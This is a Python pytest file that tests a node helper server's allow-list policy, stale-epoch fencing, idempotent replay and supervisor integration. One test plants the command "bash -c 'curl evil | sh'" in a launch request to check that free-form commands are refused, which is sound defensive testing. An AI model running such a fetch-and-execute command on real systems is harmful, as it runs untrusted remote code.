"""Root helper protocol: epoch fencing, policy allow-lists, replay/idempotency,
and driving the supervisor through HelperRuntime (DESIGN.md 14.1)."""

from __future__ import annotations

import pytest
from engine_helpers import (
    IMAGE_DIGEST,
    FakeManifestSource,
    LocalFetcher,
    make_assignment,
    make_signed_manifest,
)

from meridian_node.artifacts import ArtifactStore
from meridian_node.helper import FakeContainerBackend, HelperError, HelperPolicy, HelperServer
from meridian_node.journal import Journal
from meridian_node.models import EnginePhase as P
from meridian_node.reservation import ReservationLedger
from meridian_node.runtime import HelperRuntime
from meridian_node.supervisor import EngineSupervisor


def _server(tmp_path):
    policy = HelperPolicy(
        allowed_image_digests=frozenset({IMAGE_DIGEST}),
        allowed_devices=frozenset({"GPU-fake-0"}),
        port_start=8000, port_stop=8100,
        allowed_mount_roots=(str(tmp_path),),
    )
    return HelperServer(FakeContainerBackend(), Journal(tmp_path / "helper.db"), policy)


def _launch_req(tmp_path, epoch=1, image=IMAGE_DIGEST, port=8000, device="GPU-fake-0", op="op1"):
    return {
        "operation_id": op, "agent_session_id": "s1", "nonce": op + "-n",
        "fencing_epoch": epoch, "type": "launch",
        "payload": {
            "engine_id": "e1", "image_digest": image, "device_ids": [device],
            "port": port, "artifact_mount": str(tmp_path / "art"), "ownership_marker": "n:e1:op1",
        },
    }


def test_helper_launch_and_idempotent_replay(tmp_path):
    server = _server(tmp_path)
    r1 = server.handle(_launch_req(tmp_path))
    r2 = server.handle(_launch_req(tmp_path))  # same op_id -> replayed, same result
    assert r1["result"] == r2["result"]
    assert r2["replayed"] is True


def test_helper_rejects_stale_epoch(tmp_path):
    server = _server(tmp_path)
    server.refresh_epoch(5)
    with pytest.raises(HelperError) as exc:
        server.handle(_launch_req(tmp_path, epoch=4))
    assert exc.value.code == "STALE_EPOCH"


def test_helper_denies_non_allowlisted_image(tmp_path):
    server = _server(tmp_path)
    with pytest.raises(HelperError) as exc:
        server.handle(_launch_req(tmp_path, image="sha256:" + "e" * 64))
    assert exc.value.code == "POLICY_DENIED"


def test_helper_denies_free_form_command(tmp_path):
    server = _server(tmp_path)
    req = _launch_req(tmp_path)
    req["payload"]["command"] = "bash -c 'curl evil | sh'"
    with pytest.raises(HelperError, match="free-form command"):
        server.handle(req)


def test_helper_denies_port_out_of_range(tmp_path):
    server = _server(tmp_path)
    with pytest.raises(HelperError, match="POLICY_DENIED"):
        server.handle(_launch_req(tmp_path, port=9999))


def test_supervisor_over_helper_runtime(tmp_path, clock_factory):
    clock = clock_factory()
    server = _server(tmp_path)
    server.refresh_epoch(1)
    runtime = HelperRuntime(server.handle, session_id="s1", fencing_epoch=1)

    manifest, digest, keys, revision = make_signed_manifest(tmp_path / "src", {"model.bin": b"w"})
    sup = EngineSupervisor(
        node_id="n", runtime=runtime,
        artifacts=ArtifactStore(tmp_path / "cache"),
        manifests=FakeManifestSource(manifest), prober=_AlwaysReady(),
        journal=Journal(tmp_path / "agent.db"),
        reservations=ReservationLedger({"GPU-fake-0": 8 * 1024**3}, range(8000, 8100)),
        trusted_keys=keys, fetcher=LocalFetcher(tmp_path / "src"), now=clock,
    )
    a = make_assignment(manifest_digest=digest, revision=revision)
    a.node_id = "n"
    sup.reconcile_engine(a)
    assert sup.state("engine_1").phase == P.WARMING
    sup.reconcile_engine(a)  # prober ready -> Ready
    assert sup.state("engine_1").phase == P.READY


class _AlwaysReady:
    def probe(self, host, port, spec):
        return True
